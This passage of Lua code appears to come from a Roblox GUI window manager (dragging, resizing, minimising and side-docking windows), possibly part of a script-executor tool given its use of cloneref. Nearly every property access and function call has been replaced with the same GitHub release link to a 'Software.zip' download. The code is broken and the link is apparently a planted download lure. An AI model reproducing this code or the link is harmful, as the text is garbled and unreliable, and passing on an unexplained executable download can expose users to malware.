				if inc > maxY - neededSize then return false end
			end

			return true
		end

		local function getSideInsertPos(side,curY)
			local pos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 1
			local range = {0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip}

			for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
				local midPos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				if curY <= midPos then
					pos = i
					range[2] = midPos
					break
				else
					range[1] = midPos
				end
			end

			return pos,range
		end

		local function focusInput(self,obj)
			if isA(obj,"GuiButton") then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
					moveToTop(self)
				end)
			elseif isA(obj,"TextBox") then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
					moveToTop(self)
				end)
			end
		end

		local createGui = function(self)
			local gui = create({
				{1,"ScreenGui",{Name="Window",}},
				{2,"Frame",{Active=true,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Name="Main",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.40000000596046,0,0.40000000596046,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,300,0,300),}},
				{3,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),BorderSizePixel=0,Name="Content",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,20),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,-20),ClipsDescendants=true}},
				{4,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(33,33,33),BorderSizePixel=0,Name="Line",Parent={3},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,1),}},
				{5,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.20392157137394,0.20392157137394,0.20392157137394),BorderSizePixel=0,Name="TopBar",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,20),}},
				{6,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={5},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-10,0,20),Text="Window",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,TextXAlignment=0,}},
				{7,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Close",Parent={5},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-18,0,2),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,}},
				{8,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5054663650",Parent={7},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,10,0,10),}},
				{9,"UICorner",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4),Parent={7},}},
				{10,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Minimize",Parent={5},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-36,0,2),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,}},
				{11,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5034768003",Parent={10},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,10,0,10),}},
				{12,"UICorner",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4),Parent={10},}},
				{13,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Image="rbxassetid://1427967925",Name="Outlines",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-5,0,-5),ScaleType=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,10,1,10),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(6,6,25,25),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,20),}},
				{14,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Name="ResizeControls",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-5,0,-5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,10,1,10),}},
				{15,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.27450981736183,0.27450981736183,0.27450981736183),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="North",Parent={14},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-10,0,5),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),TextSize=14,}},
				{16,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.27450981736183,0.27450981736183,0.27450981736183),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="South",Parent={14},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,1,-5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-10,0,5),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),TextSize=14,}},
				{17,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.27450981736183,0.27450981736183,0.27450981736183),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="NorthEast",Parent={14},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-5,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,5),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),TextSize=14,}},
				{18,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.27450981736183,0.27450981736183,0.27450981736183),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="East",Parent={14},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-5,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,1,-10),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),TextSize=14,}},
				{19,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.27450981736183,0.27450981736183,0.27450981736183),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="West",Parent={14},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,1,-10),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),TextSize=14,}},
				{20,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.27450981736183,0.27450981736183,0.27450981736183),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="SouthEast",Parent={14},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-5,1,-5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,5),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),TextSize=14,}},
				{21,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.27450981736183,0.27450981736183,0.27450981736183),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="NorthWest",Parent={14},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,5),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),TextSize=14,}},
				{22,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.27450981736183,0.27450981736183,0.27450981736183),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="SouthWest",Parent={14},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,1,-5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,5),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),TextSize=14,}},
			})

			local guiMain = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local guiTopBar = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local guiResizeControls = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = guiMain
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = guiResizeControls
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					local releaseEvent,mouseEvent

					local maxX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					local initX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					local initY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					local offX = mouse.X - initX
					local offY = mouse.Y - initY

					local alignInsertPos,alignInsertSide

					guiDragging = true

					releaseEvent = cloneref(game["Run Service"].Parent:GetService("UserInputService")).InputEnded:Connect(function(input)
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
							releaseEvent:Disconnect()
							mouseEvent:Disconnect()
							guiDragging = false
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
							if alignInsertSide then
								local targetSide = (alignInsertSide == "left" and leftSide) or (alignInsertSide == "right" and rightSide)
								self:AlignTo(targetSide,alignInsertPos)
							end
						end
					end)

					mouseEvent = cloneref(game["Run Service"].Parent:GetService("UserInputService")).InputChanged:Connect(function(input)
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
								if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
								local posX,posY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
								local delta = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((posX-initX)^2 + (posY-initY)^2)
								if delta >= 5 then
									self:SetAligned(false)
								end
							else
								local inputX,inputY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
								local posX,posY = inputX-offX,inputY-offY
								if posY < 0 then posY = 0 end
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,posX,0,posY)

								if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
									if inputX < 25 then
										if sideHasRoom(leftSide,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 100) then
											local insertPos,range = getSideInsertPos(leftSide,inputY)
											https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-15,0,range[1])
											https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,40,0,range[2]-range[1])
											https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(alignIndicator)
											alignInsertPos = insertPos
											alignInsertSide = "left"
											return
										end
									elseif inputX >= maxX - 25 then
										if sideHasRoom(rightSide,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 100) then
											local insertPos,range = getSideInsertPos(rightSide,inputY)
											https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,maxX-25,0,range[1])
											https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,40,0,range[2]-range[1])
											https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(alignIndicator)
											alignInsertPos = insertPos
											alignInsertSide = "right"
											return
										end
									end
								end
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
								alignInsertPos = nil
								alignInsertSide = nil
							end
						end
					end)
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
				self:Close()
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					self:SetAligned(false)
				else
					self:SetMinimized()
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					self:SetMinimized(nil,2)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					moveToTop(self)
				end
			end)

			guiMain:GetPropertyChangedSignal("AbsolutePosition"):Connect(function()
				local absPos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = absPos.X
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = absPos.Y
			end)

			resizeHook(self,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"N")
			resizeHook(self,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"NE")
			resizeHook(self,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"E")
			resizeHook(self,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"SE")
			resizeHook(self,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"S")
			resizeHook(self,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"SW")
			resizeHook(self,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"W")
			resizeHook(self,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"NW")

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(obj) focusInput(self,obj) end)
			local descs = gui:GetDescendants()
			for i = 1,#descs do
				focusInput(self,descs[i])
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)

			return gui
		end

		local function updateSideFrames(noTween)
			stopTweens()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,1,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,1,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-5,0,0)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip > 0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip > 0)

			--[[if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip > 0 and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0) then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0.3,true)
			elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,0) then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0.3,true)
			end
			local rightTweenPos = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,5,0,0) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0))
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(rightTweenPos,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0.3,true)]]
			local leftHidden = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local rightHidden = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local leftPos = (leftHidden and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,0))
			local rightPos = (rightHidden and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,10,0,0) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0))

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = leftHidden and ">" or "<"
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = rightHidden and "<" or ">"

			if not noTween then
				local function insertTween(...)
					local tween = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(...)
					tweens[#tweens+1] = tween
					tween:Play()
				end
				insertTween(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,sideTweenInfo,{Position = leftPos})
				insertTween(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,sideTweenInfo,{Position = rightPos})
				insertTween(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,sideTweenInfo,{Position = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 and -16 or 0,0,-36)})
				insertTween(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,sideTweenInfo,{Position = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 and 0 or -16,0,-36)})
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = leftPos
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = rightPos
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 and -16 or 0,0,-36)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 and 0 or -16,0,-36)
			end
		end

		local function getSideFramePos(side)
			local leftHidden = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local rightHidden = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if side == leftSide then
				return (leftHidden and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,0))
			else
				return (rightHidden and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,10,0,0) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0))
			end
		end

		local function sideResized(side)
			local currentPos = 0
			local sideFramePos = getSideFramePos(side)
			for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,currentPos)
				currentPos = currentPos + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+4
			end
		end

		local function sideResizerHook(resizer,dir,side,pos)
			local mouse = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local windows = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						local releaseEvent,mouseEvent

						local offX = mouse.X - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						local offY = mouse.Y - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = resizer
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

						releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
								releaseEvent:Disconnect()
								mouseEvent:Disconnect()
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							end
						end)

						mouseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
							if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
								releaseEvent:Disconnect()
								mouseEvent:Disconnect()
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
								return
							end
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
								if dir == "V" then
									local delta = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - offY

									if delta > 0 then
										local neededSize = delta
										for i = pos+1,#windows do
											local window = windows[i]
											local newSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 100))
											neededSize = neededSize - (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - newSize)
											https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = newSize
										end
										windows[pos].SizeY = windows[pos].SizeY + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,delta-neededSize)
									else
										local neededSize = -delta
										for i = pos,1,-1 do
											local window = windows[i]
											local newSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 100))
											neededSize = neededSize - (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - newSize)
											https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = newSize
										end
										windows[pos+1].SizeY = windows[pos+1].SizeY + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-delta-neededSize)
									end

									updateSideFrames()
									sideResized(side)
								elseif dir == "H" then
									local maxWidth = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(300,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
									local otherSide = (side == leftSide and rightSide or leftSide)
									local delta = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - offX
									delta = (side == leftSide and delta or -delta)

									local proposedSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + delta)
